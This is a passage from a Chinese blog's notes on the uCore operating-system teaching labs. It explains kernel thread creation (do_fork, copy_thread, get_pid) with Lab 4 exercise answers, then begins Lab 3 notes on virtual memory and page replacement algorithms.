<p>而且，在大多数情况下，调用<code>fork</code>函数后就紧接着调用<code>exec</code>，此时<code>fork</code>中的内存复制操作是无用的。因此，<code>fork</code>函数中使用<strong>写时复制技术(Copy on Write， COW)</strong>。</p>
</li>
</ul>
<h5 id="a-空闲进程的创建">a. 空闲进程的创建</h5>
<ul>
<li>
<p>空闲进程主要工作是完成内核中各个子系统的初始化，并最后用于调度其他进程。该进程最终会一直在<code>cpu_idle</code>函数中判断当前是否可调度。</p>
</li>
<li>
<p>由于该进程是为了调度进程而创建的，所以其<code>need_resched</code>成员初始时为1。</p>
</li>
<li>
<p>uCore创建该空闲进程的源代码如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 分配一个proc_struct结构</span></span><br><span class="line"><span class="keyword">if</span> ((idleproc = alloc_proc()) == <span class="literal">NULL</span>)</span><br><span class="line">    panic(<span class="string">"cannot alloc idleproc.\n"</span>);</span><br><span class="line"><span class="comment">// 该空闲进程作为第一个进程，pid为0</span></span><br><span class="line">idleproc-&gt;pid = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// 设置该空闲进程始终可运行</span></span><br><span class="line">idleproc-&gt;state = PROC_RUNNABLE;</span><br><span class="line"><span class="comment">// 设置空闲进程的内核栈</span></span><br><span class="line">idleproc-&gt;kstack = (<span class="keyword">uintptr_t</span>)bootstack;</span><br><span class="line"><span class="comment">// 设置该空闲进程为可调度</span></span><br><span class="line">idleproc-&gt;need_resched = <span class="number">1</span>;</span><br><span class="line">set_proc_name(idleproc, <span class="string">"idle"</span>);</span><br><span class="line">nr_process++;</span><br><span class="line"><span class="comment">// 设置当前运行的进程为该空闲进程</span></span><br><span class="line">current = idleproc;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h5 id="b-第一个内核进程的创建">b. 第一个内核进程的创建</h5>
<ul>
<li>
<p>第一个内核进程是未来所有新进程的父进程或祖先进程。</p>
</li>
<li>
<p>uCore创建第一个内核进程的代码如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建init的主线程</span></span><br><span class="line"><span class="keyword">int</span> pid = kernel_thread(init_main, <span class="string">"Hello world!!"</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (pid &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">    panic(<span class="string">"create init_main failed.\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 通过pid 查找proc_struct</span></span><br><span class="line">initproc = find_proc(pid);</span><br><span class="line">set_proc_name(initproc, <span class="string">"init"</span>);</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>在<code>kernel_thread</code>中，程序先设置<code>trapframe</code>结构，最后调用<code>do_fork</code>函数。注意该<code>trapframe</code>部分寄存器<code>ebx、edx、eip</code>被分别设置为<strong>目标函数地址</strong>、<strong>参数地址</strong>以及<strong>kernel_thread_entry</strong>地址（稍后会讲）。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">kernel_thread(<span class="keyword">int</span> (*fn)(<span class="keyword">void</span> *), <span class="keyword">void</span> *arg, <span class="keyword">uint32_t</span> clone_flags) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> <span class="title">tf</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;tf, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct trapframe));</span><br><span class="line">    tf.tf_cs = KERNEL_CS;</span><br><span class="line">    tf.tf_ds = tf.tf_es = tf.tf_ss = KERNEL_DS;</span><br><span class="line">    <span class="comment">// ebx = fn</span></span><br><span class="line">    tf.tf_regs.reg_ebx = (<span class="keyword">uint32_t</span>)fn;</span><br><span class="line">    <span class="comment">// edx = arg</span></span><br><span class="line">    tf.tf_regs.reg_edx = (<span class="keyword">uint32_t</span>)arg;</span><br><span class="line">    <span class="comment">// eip = kernel_thread_entry</span></span><br><span class="line">    tf.tf_eip = (<span class="keyword">uint32_t</span>)kernel_thread_entry;</span><br><span class="line">    <span class="keyword">return</span> do_fork(clone_flags | CLONE_VM, <span class="number">0</span>, &amp;tf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>do_fork</code>函数会执行以下操作</p>
<ul>
<li>分配新进程的PCB，并设置PCB相关成员，包括父进程PCB地址，新内核栈地址，新PID等等。</li>
<li>复制/共享当前进程的所有内存空间到子进程里。</li>
<li>复制当前线程的上下文状态至子进程中。</li>
<li>将子进程PCB分别插入至普通双向链表与哈希表中，设置该子进程为可执行，并最终返回该子进程的PID。</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">do_fork(<span class="keyword">uint32_t</span> clone_flags, <span class="keyword">uintptr_t</span> <span class="built_in">stack</span>, struct trapframe *tf) &#123;</span><br><span class="line">    <span class="keyword">int</span> ret = -E_NO_FREE_PROC;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (nr_process &gt;= MAX_PROCESS)</span><br><span class="line">        <span class="keyword">goto</span> fork_out;</span><br><span class="line">    ret = -E_NO_MEM;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 首先分配一个PCB</span></span><br><span class="line">    <span class="keyword">if</span> ((proc = alloc_proc()) == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">goto</span> fork_out;</span><br><span class="line">    <span class="comment">// fork肯定存在父进程，所以设置子进程的父进程</span></span><br><span class="line">    proc-&gt;parent = current;</span><br><span class="line">    <span class="comment">// 分配内核栈</span></span><br><span class="line">    <span class="keyword">if</span> (setup_kstack(proc) != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> bad_fork_cleanup_proc;</span><br><span class="line">    <span class="comment">// 将所有虚拟页数据复制过去</span></span><br><span class="line">    <span class="keyword">if</span> (copy_mm(clone_flags, proc) != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> bad_fork_cleanup_kstack;</span><br><span class="line">    <span class="comment">// 复制线程的状态，包括寄存器上下文等等</span></span><br><span class="line">    copy_thread(proc, <span class="built_in">stack</span>, tf);</span><br><span class="line">    <span class="comment">// 将子进程的PCB添加进hash list或者list</span></span><br><span class="line">    <span class="comment">// 需要注意的是，不能让中断处理程序打断这一步操作</span></span><br><span class="line">    <span class="keyword">bool</span> intr_flag;</span><br><span class="line">    local_intr_save(intr_flag);</span><br><span class="line">    &#123;</span><br><span class="line">        proc-&gt;pid = get_pid();</span><br><span class="line">        hash_proc(proc);</span><br><span class="line">        list_add(&amp;proc_list, &amp;(proc-&gt;list_link));</span><br><span class="line">        nr_process ++;</span><br><span class="line">    &#125;</span><br><span class="line">    local_intr_restore(intr_flag);</span><br><span class="line">    <span class="comment">// 设置新的子进程可执行</span></span><br><span class="line">    wakeup_proc(proc);</span><br><span class="line">    <span class="comment">// 返回子进程的pid</span></span><br><span class="line">    ret = proc-&gt;pid;</span><br><span class="line"></span><br><span class="line">fork_out:</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">bad_fork_cleanup_kstack:</span><br><span class="line">    put_kstack(proc);</span><br><span class="line">bad_fork_cleanup_proc:</span><br><span class="line">    kfree(proc);</span><br><span class="line">    <span class="keyword">goto</span> fork_out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>do_fork</code>函数中的<code>copy_thread</code>函数会执行以下操作</p>
<ul>
<li>
<p>将<code>kernel_thread</code>中创建的新<code>trapframe</code>内容复制到该<code>proc</code>的<code>tf</code>成员中，并压入该进程自身的内核栈。</p>
</li>
<li>
<p>设置<code>trapframe</code>的<code>eax</code>寄存器值为0，<code>esp</code>寄存器值为传入的<code>esp</code>，以及<code>eflags</code>加上中断标志位。</p>
<blockquote>
<p>设置eax寄存器的值为0，是因为子进程的fork函数返回的值为0。</p>
</blockquote>
</li>
<li>
<p>最后，设置子进程上下文的<code>eip</code>为<code>forkret</code>，<code>esp</code>为该<code>trapframe</code>的地址。</p>
</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">copy_thread(struct proc_struct *proc, <span class="keyword">uintptr_t</span> esp, struct trapframe *tf) &#123;</span><br><span class="line">    proc-&gt;tf = (struct trapframe *)(proc-&gt;kstack + KSTACKSIZE) - <span class="number">1</span>;</span><br><span class="line">    *(proc-&gt;tf) = *tf;</span><br><span class="line">    proc-&gt;tf-&gt;tf_regs.reg_eax = <span class="number">0</span>;</span><br><span class="line">    proc-&gt;tf-&gt;tf_esp = esp;</span><br><span class="line">    proc-&gt;tf-&gt;tf_eflags |= FL_IF;</span><br><span class="line"></span><br><span class="line">    proc-&gt;context.eip = (<span class="keyword">uintptr_t</span>)forkret;</span><br><span class="line">    proc-&gt;context.esp = (<span class="keyword">uintptr_t</span>)(proc-&gt;tf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>当该子进程被调度运行，上下文切换后（即此时current为该子进程的PCB地址），子进程会跳转至<code>forkret</code>，而该函数是<code>forkrets</code>的一个wrapper。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">forkret</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    forkrets(current-&gt;tf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>forkrets</code>是干什么用的呢？从<code>current-&gt;tf</code>中恢复上下文，跳转至<code>current-&gt;tf-&gt;tf_eip</code>，也就是<code>kernel_thread_entry</code>。</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">    # return falls through to trapret...</span><br><span class="line"><span class="meta">.globl</span> __trapret</span><br><span class="line"><span class="symbol">__trapret:</span></span><br><span class="line">    # restore registers from stack</span><br><span class="line">    popal</span><br><span class="line"></span><br><span class="line">    # restore %ds, %es, %fs <span class="keyword">and</span> %gs</span><br><span class="line">    popl %gs</span><br><span class="line">    popl %fs</span><br><span class="line">    popl %es</span><br><span class="line">    popl %ds</span><br><span class="line"></span><br><span class="line">    # get rid of the trap number <span class="keyword">and</span> error code</span><br><span class="line">    addl <span class="number">$0</span>x8, %esp</span><br><span class="line">    <span class="keyword">iret</span></span><br><span class="line"></span><br><span class="line"><span class="meta">.globl</span> forkrets</span><br><span class="line"><span class="symbol">forkrets:</span></span><br><span class="line">    # set stack to this new process<span class="string">'s trapframe</span></span><br><span class="line"><span class="string">    movl 4(%esp), %esp</span></span><br><span class="line"><span class="string">    jmp __trapret</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>kernel_thread_entry</code>的代码非常简单，压入<code>%edx</code>寄存器的值作为参数，并调用<code>%ebx</code>寄存器所指向的代码，最后保存调用的函数的返回值，并<code>do_exit</code>。</p>
<p>以<code>initproc</code>为例，该函数此时的<code>%edx</code>即<code>&quot;Hello world!!&quot;</code>字符串的地址，<code>%ebx</code>即<code>init_main</code>函数的地址。</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="meta">.text</span>.</span><br><span class="line"><span class="meta">.globl</span> kernel_thread_entry</span><br><span class="line"><span class="symbol">kernel_thread_entry:</span>        # void kernel_thread(void)</span><br><span class="line"></span><br><span class="line">    pushl %edx              # <span class="keyword">push</span> arg</span><br><span class="line">    <span class="keyword">call</span> *%ebx              # <span class="keyword">call</span> fn</span><br><span class="line"></span><br><span class="line">    pushl %eax              # save the return value of fn(arg)</span><br><span class="line">    <span class="keyword">call</span> do_exit            # <span class="keyword">call</span> do_exit to terminate current thread</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>kernel_thread</code>函数设置控制流起始地址为<code>kernel_thread_entry</code>的目的，是想让一个内核进程在执行完函数后能够<strong>自动调用<code>do_exit</code>回收资源</strong>。</p>
</blockquote>
</li>
</ul>
<h4 id="3-进程终止">3) 进程终止</h4>
<p>​这里只简单介绍进程的<strong>有序终止</strong>。</p>
<ul>
<li>进程结束时调用<code>exit()</code>，完成进程资源回收。</li>
<li><code>exit</code>函数调用的功能
<ul>
<li>将调用参数作为进程的“结果”</li>
<li>关闭所有打开的文件等占用资源。</li>
<li>释放内存</li>
<li>释放大部分进程相关的内核数据结构</li>
<li>检查父进程是否存活
<ul>
<li>如果存活，则保留结果的值，直到父进程使用。同时当前进程进入僵尸(zombie)状态。</li>
<li>如果没有，它将释放所有的数据结构，进程结束。</li>
</ul>
</li>
<li>清理所有等待的僵尸进程。</li>
</ul>
</li>
<li>进程终止是最终的垃圾收集（资源回收）。</li>
</ul>
<h2 id="练习解答">练习解答</h2>
<h3 id="1-练习1">1) 练习1</h3>
<blockquote>
<p><strong>分配并初始化一个进程控制块。</strong></p>
<p>alloc_proc函数（位于kern/process/proc.c中）负责分配并返回一个新的struct proc_struct结构，用于存储新建立的内核线程的管理信息。ucore需要对这个结构进行最基本的初始化，你需要完成这个初始化过程。</p>
</blockquote>
<p>相关实现代码如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct proc_struct * <span class="title">alloc_proc</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span> = <span class="title">kmalloc</span>(<span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">proc_struct</span>));</span></span><br><span class="line">    <span class="keyword">if</span> (proc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="comment">//LAB4:EXERCISE1 YOUR CODE</span></span><br><span class="line">        proc-&gt;state = PROC_UNINIT;</span><br><span class="line">        proc-&gt;pid = <span class="number">-1</span>;</span><br><span class="line">        proc-&gt;runs = <span class="number">0</span>;</span><br><span class="line">        proc-&gt;kstack = <span class="number">0</span>;</span><br><span class="line">        proc-&gt;need_resched = <span class="number">0</span>;</span><br><span class="line">        proc-&gt;parent = <span class="literal">NULL</span>;</span><br><span class="line">        proc-&gt;mm = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;(proc-&gt;context), <span class="number">0</span>, <span class="keyword">sizeof</span>(struct context));</span><br><span class="line">        proc-&gt;tf = <span class="literal">NULL</span>;</span><br><span class="line">        proc-&gt;cr3 = boot_cr3;</span><br><span class="line">        proc-&gt;flags = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">memset</span>(proc-&gt;name, <span class="number">0</span>, PROC_NAME_LEN);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> proc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>请说明proc_struct中<code>struct context context</code>和<code>struct trapframe *tf</code>成员变量含义和在本实验中的作用是什么？
<ul>
<li>
<p><code>struct context context</code>：储存进程当前状态，用于进程切换中上下文的保存与恢复。</p>
<p>需要注意的是，与<code>trapframe</code>所保存的用户态上下文不同，context保存的是线程的<strong>当前</strong>上下文。这个上下文可能是执行用户代码时的上下文，也可能是执行内核代码时的上下文。</p>
</li>
<li>
<p><code>struct trapframe* tf</code>：无论是用户程序在用户态通过系统调用进入内核态，还是线程在内核态中被创建，内核态中的线程返回用户态所加载的上下文就是<code>struct trapframe* tf</code>。 所以当一个线程在内核态中建立，则该新线程就必须伪造一个<code>trapframe</code>来返回用户态。</p>
<blockquote>
<p>思考一下，从用户态进入内核态会压入当时的用户态上下文<code>trapframe</code>。</p>
</blockquote>
</li>
<li>
<p>两者关系：以<code>kernel_thread</code>函数为例，尽管该函数设置了<code>proc-&gt;trapframe</code>，但在<code>fork</code>函数中的<code>copy_thread</code>函数里，程序还会设置<code>proc-&gt;context</code>。两个<strong>上下文</strong>看上去好像冗余，但实际上两者所分的工是不一样的。</p>
<p>进程之间通过进程调度来切换控制权，当某个<code>fork</code>出的新进程获取到了控制流后，首当其中执行的代码是<code>current-&gt;context-&gt;eip</code>所指向的代码，此时新进程仍处于内核态，但实际上我们想在用户态中执行代码，所以我们需要从内核态切换回用户态，也就是中断返回。此时会遇上两个问题：</p>
<ul>
<li><strong>新进程如何执行中断返回？</strong> 这就是<code>proc-&gt;context.eip = (uintptr_t)forkret</code>的用处。<code>forkret</code>会使新进程正确的从中断处理例程中返回。</li>
<li><strong>新进程中断返回至用户代码时的上下文为？</strong> 这就是<code>proc_struct-&gt;tf</code>的用处。中断返回时，新进程会恢复保存的<code>trapframe</code>信息至各个寄存器中，然后开始执行用户代码。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="2-练习2">2) 练习2</h3>
<blockquote>
<p><strong>为新创建的内核线程分配资源</strong></p>
<p>do_fork的作用是，创建当前内核线程的一个副本，它们的执行上下文、代码、数据都一样，但是存储位置不同。在这个过程中，需要给新内核线程分配资源，并且复制原进程的状态。</p>
</blockquote>
<p>实现代码如下，详细信息以注释的形式写到代码中：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">do_fork</span><span class="params">(<span class="keyword">uint32_t</span> clone_flags, <span class="keyword">uintptr_t</span> <span class="built_in">stack</span>, struct trapframe *tf)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = -E_NO_FREE_PROC;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (nr_process &gt;= MAX_PROCESS) &#123;</span><br><span class="line">        <span class="keyword">goto</span> fork_out;</span><br><span class="line">    &#125;</span><br><span class="line">    ret = -E_NO_MEM;</span><br><span class="line">    <span class="comment">//LAB4:EXERCISE2 YOUR CODE</span></span><br><span class="line">    <span class="comment">// 首先分配一个PCB</span></span><br><span class="line">    <span class="keyword">if</span> ((proc = alloc_proc()) == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">goto</span> fork_out;</span><br><span class="line">    <span class="comment">// fork肯定存在父进程，所以设置子进程的父进程</span></span><br><span class="line">    proc-&gt;parent = current;</span><br><span class="line">    <span class="comment">// 分配内核栈</span></span><br><span class="line">    <span class="keyword">if</span> (setup_kstack(proc) != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> bad_fork_cleanup_proc;</span><br><span class="line">    <span class="comment">// 将所有虚拟页数据复制过去</span></span><br><span class="line">    <span class="keyword">if</span> (copy_mm(clone_flags, proc) != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> bad_fork_cleanup_kstack;</span><br><span class="line">    <span class="comment">// 复制线程的状态，包括寄存器上下文等等</span></span><br><span class="line">    copy_thread(proc, <span class="built_in">stack</span>, tf);</span><br><span class="line">    <span class="comment">// 将子进程的PCB添加进hash list或者list</span></span><br><span class="line">    <span class="comment">// 需要注意的是，不能让中断处理程序打断这一步操作</span></span><br><span class="line">    <span class="keyword">bool</span> intr_flag;</span><br><span class="line">    local_intr_save(intr_flag);</span><br><span class="line">    &#123;</span><br><span class="line">        proc-&gt;pid = get_pid();</span><br><span class="line">        hash_proc(proc);</span><br><span class="line">        list_add(&amp;proc_list, &amp;(proc-&gt;list_link));</span><br><span class="line">        nr_process ++;</span><br><span class="line">    &#125;</span><br><span class="line">    local_intr_restore(intr_flag);</span><br><span class="line">    <span class="comment">// 设置新的子进程可执行</span></span><br><span class="line">    wakeup_proc(proc);</span><br><span class="line">    <span class="comment">// 返回子进程的pid</span></span><br><span class="line">    ret = proc-&gt;pid;</span><br><span class="line"></span><br><span class="line">fork_out:</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">bad_fork_cleanup_kstack:</span><br><span class="line">    put_kstack(proc);</span><br><span class="line">bad_fork_cleanup_proc:</span><br><span class="line">    kfree(proc);</span><br><span class="line">    <span class="keyword">goto</span> fork_out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>请说明ucore是否做到给每个新fork的线程一个唯一的id？请说明你的分析和理由。</p>
<blockquote>
<p><code>get_pid</code>这个函数其实我一开始是没打算研究的，谁知道竟然出成题目了T_T。</p>
</blockquote>
<p>uCore中，每个新fork的线程都存在唯一的一个ID，理由如下：</p>
<ul>
<li>
<p>在函数<code>get_pid</code>中，如果静态成员<code>last_pid</code>小于<code>next_safe</code>，则当前分配的<code>last_pid</code>一定是安全的，即唯一的PID。</p>
</li>
<li>
<p>但如果<code>last_pid</code>大于等于<code>next_safe</code>，或者<code>last_pid</code>的值超过<code>MAX_PID</code>，则当前的<code>last_pid</code>就不一定是唯一的PID，此时就需要遍历<code>proc_list</code>，重新对<code>last_pid</code>和<code>next_safe</code>进行设置，为下一次的<code>get_pid</code>调用打下基础。</p>
</li>
<li>
<p>之所以在该函数中维护一个合法的<code>PID</code>的区间，是为了<strong>优化时间效率</strong>。如果简单的暴力搜索，则需要搜索大部分PID和所有的线程，这会使该算法的时间消耗很大，因此使用<code>PID</code>区间来优化算法。</p>
</li>
<li>
<p><code>get_pid</code>代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// get_pid - alloc a unique pid for process</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">get_pid(<span class="keyword">void</span>) &#123;</span><br><span class="line">    <span class="keyword">static_assert</span>(MAX_PID &gt; MAX_PROCESS);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span>;</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> *<span class="built_in">list</span> = &amp;proc_list, *le;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> next_safe = MAX_PID, last_pid = MAX_PID;</span><br><span class="line">    <span class="keyword">if</span> (++ last_pid &gt;= MAX_PID) &#123;</span><br><span class="line">        last_pid = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">goto</span> inside;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (last_pid &gt;= next_safe) &#123;</span><br><span class="line">    inside:</span><br><span class="line">        next_safe = MAX_PID;</span><br><span class="line">    repeat:</span><br><span class="line">        le = <span class="built_in">list</span>;</span><br><span class="line">        <span class="keyword">while</span> ((le = list_next(le)) != <span class="built_in">list</span>) &#123;</span><br><span class="line">            proc = le2proc(le, list_link);</span><br><span class="line">            <span class="keyword">if</span> (proc-&gt;pid == last_pid) &#123;</span><br><span class="line">                <span class="keyword">if</span> (++ last_pid &gt;= next_safe) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (last_pid &gt;= MAX_PID)</span><br><span class="line">                        last_pid = <span class="number">1</span>;</span><br><span class="line">                    next_safe = MAX_PID;</span><br><span class="line">                    <span class="keyword">goto</span> repeat;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (proc-&gt;pid &gt; last_pid &amp;&amp; next_safe &gt; proc-&gt;pid)</span><br><span class="line">                next_safe = proc-&gt;pid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> last_pid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<h3 id="3-练习3">3) 练习3</h3>
<blockquote>
<p><strong>阅读代码，理解 proc_run 函数和它调用的函数如何完成进程切换的。</strong></p>
</blockquote>
<p>请移步<a href="#c-%E5%88%87%E6%8D%A2%E6%B5%81%E7%A8%8B">切换流程</a></p>
<ul>
<li>在本实验的执行过程中，创建且运行了几个内核线程？
<ul>
<li>两个内核线程，分别是<code>idleproc</code>和<code>initproc</code>。</li>
<li>更多关于<code>idleproc</code>和<code>initproc</code>的信息请移步 <a href="#a-%E7%A9%BA%E9%97%B2%E8%BF%9B%E7%A8%8B%E7%9A%84%E5%88%9B%E5%BB%BA">idleproc的创建</a> 和 <a href="#b-%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%86%85%E6%A0%B8%E8%BF%9B%E7%A8%8B%E7%9A%84%E5%88%9B%E5%BB%BA">initproc的创建</a></li>
</ul>
</li>
<li>语句<code>local_intr_save(intr_flag);....local_intr_restore(intr_flag);</code>在这里有何作用?请说明理由。
<ul>
<li>这两句代码的作用分别是<strong>阻塞中断</strong>和<strong>解除中断的阻塞</strong>。</li>
<li>这两句的配合，使得这两句代码之间的代码块形成<strong>原子操作</strong>，可以使得某些关键的代码不会被打断，从而避免引起一些未预料到的错误，避免条件竞争。</li>
<li>以进程切换为例，在<code>proc_run</code>中，当刚设置好<code>current</code>指针为下一个进程，但还未完全将控制权转移时，如果该过程突然被一个中断所打断，则中断处理例程的执行可能会引发异常，因为<code>current</code>指针指向的进程与实际使用的进程资源不一致。</li>
</ul>
</li>
</ul>
<h3 id="4-扩展练习">4) 扩展练习</h3>
<blockquote>
<p><strong>实现支持任意大小的内存分配算法</strong></p>
<p>考虑到现在的slab算法比较复杂，有必要实现一个比较简单的任意大小内存分配算法。可参考本实验中的slab如何调用基于页的内存分配算法来实现first-fit/best-fit/worst-fit/buddy等支持任意大小的内存分配算法。</p>
</blockquote>
<blockquote>
<p>暂鸽，后补。</p>
</blockquote>
]]></content>
      <categories>
        <category>天问之路</category>
      </categories>
      <tags>
        <tag>uCore</tag>
        <tag>OS</tag>
      </tags>
  </entry>
  <entry>
    <title>uCore实验 - Lab3</title>
    <url>/2020/08/uCore-3/</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
<ul>
<li>这里是笔者在完成<code>uCore</code> Lab 3时写下的一些笔记</li>
<li>内容涉及虚拟内存存储等</li>
<li>内容较多，建议使用右侧导航栏。</li>
</ul>
<a id="more"></a>
<h2 id="知识点">知识点</h2>
<h3 id="1-虚拟内存">1. 虚拟内存</h3>
<ul>
<li>
<p>虚拟内存是CPU可以看到的“内存”。</p>
<ul>
<li>虚拟内存所对应的实际物理内存单元可能不存在。</li>
<li>虚拟内存的地址和对应物理内存的地址可能不一致。</li>
<li>通过操作系统所实现的某种内存映射机制，可以达到访问的虚拟内存地址转换为物理内存地址的目的。</li>
</ul>
</li>
<li>
<p>当程序访问内存遇上特殊情况时，CPU会执行第十四号中断处理程序——缺页处理程序来处理。</p>
<ul>
<li>
<p>特殊情况有以下两种</p>
<ul>
<li><strong>写入</strong>一个<strong>存在物理页</strong>的虚拟页——<strong>写时复制</strong>。</li>
<li>读写一个不存在物理页的虚拟页——<strong>缺页</strong>。</li>
<li>不满足访问权限。</li>
</ul>
</li>
<li>
<p>当程序触发缺页中断时，CPU会把产生异常的线性地址存储在<strong>CR2</strong>寄存器中，并且把<strong>页访问异常错误码</strong>保存在中断栈中。</p>
<blockquote>
<p>其中，页访问异常错误码的位0为１表示对应物理页不存在；位１为１表示写异常；位２为１表示访问权限异常。</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p>由于虚拟内存空间比物理内存空间大得多，所以必须在合适的情况下，将不常用的页面调至外存，或者将待用的页面从外存调入内存中。 <strong>这个过程对应用程序无感。</strong> 而什么时候调进调出，选择哪个页面调出，这都是值得考究的，这就是使用页面置换算法的目的。</p>
</li>
</ul>
<h3 id="2-页面置换算法小叙">2. 页面置换算法小叙</h3>
<blockquote>
<p>当物理页面不够用时，需要将某个页面置换到外存中。</p>
<p>那么该置换哪个物理页面呢？这就是页面置换算法的用处。</p>
</blockquote>
<h4 id="I-局部页面置换算法">I. 局部页面置换算法</h4>
<blockquote>
<p>置换页面的选择范围仅限于当前进程占用的物理页面内.</p>
</blockquote>
<h5 id="1-最近最少用算法（LRU）">1) 最近最少用算法（LRU）</h5>
<h6 id="a-简介">a. 简介</h6>
<ul>
<li>思路：选择<strong>最长时间没有被引用</strong>的页面进行置换。</li>
<li>实现：缺页时，计算内存中每个逻辑页面的上一个访问时间，并选择<strong>上一个使用到当前时间最长</strong>的页面。</li>
<li>特征：最优置换算法的一种近似。</li>
</ul>
<h6 id="b-具体实现">b. 具体实现</h6>
<ul>
<li>页面链表
<ul>
<li>系统维护一个按最近一次访问时间排序的页面链表
<ul>
<li>链表首节点是最近刚刚使用过的页面</li>
<li>链表尾结点是最久未使用的页面</li>
</ul>
</li>
<li>访问内存时，找到相应页面并将其移至链表之首</li>
<li>缺页时，置换链表尾结点的页面</li>
</ul>
</li>
<li>活动页面栈
<ul>
<li>访问页面时，将此页号压入栈底。并将栈内相同的页号抽出</li>
<li>缺页时，置换栈底的页面。</li>
</ul>
</li>
</ul>
<blockquote>
<p>上述的两种实现都需要维护以及遍历搜索某个数据结构，</p>
<p>同时LRU对于过去的访问情况统计<strong>过于细致</strong>，所以该方法较为复杂。</p>
</blockquote>
<h5 id="2-改进的时钟页面置换算法（Clock）">2) 改进的时钟页面置换算法（Clock）</h5>
<h6 id="a-简介-2">a. 简介</h6>
<ul>
<li>思路：
<ul>
<li>仅对页面的访问情况进行大致统计</li>
<li>减小修改页的缺页处理开销</li>
</ul>
</li>
<li>数据结构：
<ul>
<li>在页表项中增加访问位，描述页面在过去一段时间的内访问情况。</li>
<li>在页表项中增加修改位，以判断当前页面是否修改过但没有存入外存。</li>
<li>各页面组织成环形链表，同时指针指向最先调入的页面。</li>
</ul>
</li>
<li>算法
<ul>
<li>访问页面时，在页表项记录页面访问情况</li>
<li>缺页时，从指针处开始顺序查找<strong>未被访问与未被修改</strong>的页面进行置换。</li>
</ul>
</li>
<li>特征： 时钟算法是LRU与FIFO的折中。</li>
</ul>
<h6 id="b-具体实现-2">b. 具体实现</h6>
<ul>
<li>页面装入内存时，访问位初始化为0</li>
<li>访问页面（读/写）时，访问位置为1</li>
